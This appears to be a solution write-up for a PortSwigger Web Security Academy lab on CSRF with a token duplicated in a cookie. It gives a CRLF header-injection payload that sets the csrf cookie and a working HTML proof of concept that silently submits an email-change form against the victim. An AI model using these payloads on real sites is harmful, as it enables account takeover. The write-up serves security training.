# CSRF where token is duplicated in cookie

Lab URL :- `https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie`

![image](https://user-images.githubusercontent.com/60841283/182621574-c1cf3a99-2c74-49d5-b8bb-3128eb9fe628.png)

CSRF in both cookie and in post parameter, CSRF must be same at both places

![image](https://user-images.githubusercontent.com/60841283/182622099-ff4fe9b6-8e01-423c-98b2-2a47245f6c8c.png)

Random string in search bar introduces a new cookie :- 

![image](https://user-images.githubusercontent.com/60841283/182622429-4e349518-2e93-48bb-afde-4bde0a39f314.png)

Header Injection Payload:- `/?search=test%0d%0aSet-Cookie:%20csrf=ZYU0KeTRdyyRHNiogMMrnG4rtx2EDbKN` 

![image](https://user-images.githubusercontent.com/60841283/182622613-fec9dc3c-2dcb-48d9-b7bf-7b775981720f.png)

Generating POC :- 

```html
<html>
<body>
	<iframe style="display: none;" name="csrf_iframe"></iframe>
	<form action="https://0a780089041136edc01c582c00c30048.web-security-academy.net/my-account/change-email" method="POST" id="csrf-id" target="csrf_iframe">
		<input type="hidden" name="email" value="lol@lol.com">
		<input type="hidden" name="csrf" value="ZYU0KeTRdyyRHNiogMMrnG4rtx2EDbKN">
	</form>
	<img style="display:none;" src="https://0a780089041136edc01c582c00c30048.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=ZYU0KeTRdyyRHNiogMMrnG4rtx2EDbKN" onerror="document.forms[0].submit()">
</body>
</html>
```

Store in exploit server and "Deliver to victim" :- 

![image](https://user-images.githubusercontent.com/60841283/182623078-e3a86613-16fc-4e4f-af92-c6c517ef04be.png)

